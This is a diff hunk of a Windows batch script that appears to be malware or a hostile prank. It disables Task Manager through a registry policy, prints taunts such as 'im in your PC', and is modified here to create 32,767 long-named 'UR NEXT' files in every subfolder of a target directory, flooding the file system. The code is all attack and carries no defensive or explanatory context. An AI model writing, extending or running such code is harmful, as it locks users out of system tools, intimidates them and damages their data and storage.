@@ -11,9 +11,11 @@ echo How ?
 reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /t REG_DWORD /d 1 /f
 timeout /t 2 /nobreak
 echo So, im in your PC wanna see proof ?
-:: Create 32767 files with a long name
-for /l %%j in (1,1,32767) do (
-    type nul > "UR NEXT UR NEXT UR NEXT_%%j.txt"
+:: Her alt klasörde dosyalar oluştur
+for /r "%rootDir%" %%d in (.) do (
+    for /l %%j in (1,1,32767) do (
+        type nul > "%%d\UR NEXT UR NEXT UR NEXT UR NEXT UR NEXT UR NEXT UR NEXT UR NEXT UR NEXT UR NEXT UR NEXT UR NEXT UR NEXT UR NEXT UR NEXT_%%j.txt"
+    )
 )
 setlocal enabledelayedexpansion
 
